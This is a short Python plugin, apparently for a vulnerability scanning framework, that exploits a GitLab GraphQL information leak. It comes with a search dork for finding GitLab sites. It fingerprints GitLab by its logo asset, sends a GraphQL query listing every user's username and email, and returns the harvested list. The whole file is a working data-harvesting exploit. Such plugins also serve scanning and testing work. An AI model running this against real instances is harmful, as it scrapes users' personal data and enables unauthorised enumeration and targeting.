# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "GitLab Graphql邮箱信息泄露漏洞",
        "dork": "title=\"GitLab\"",
        "description": "GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名",
        "references": ["-"]
    }

    def __condition__(self):
        return self.condition(
            matches=[
                {
                    "search": "meta",
                    "keyword": ["assets/gitlab_logo"]
                }
            ]
        )

    def url(self) -> dict:
        r = self.request(
            method='post',
            path='./api/graphql',
            json={
                "query": "query {\nusers {\nedges {\nnode{\nusername\nemail\navatarUrl\nstatus{\nemoji\nmessage\nmessageHtml\n}\n\n}\n}\n}\n}",
                "variables": None,
                "operationName": None
            },
            headers={'Content-Type': 'application/json'},
            timeout=15
        )
        if r.status_code == 200:
            resp = r.json()
            if resp['data']['users']:
                self.__info__['data'] = [
                    {'username': i['node']['username'], 'email': i['node']['email']} for i in resp['data']['users']['edges']
                ]
                return {"LoopholeInfo": self.__info__}
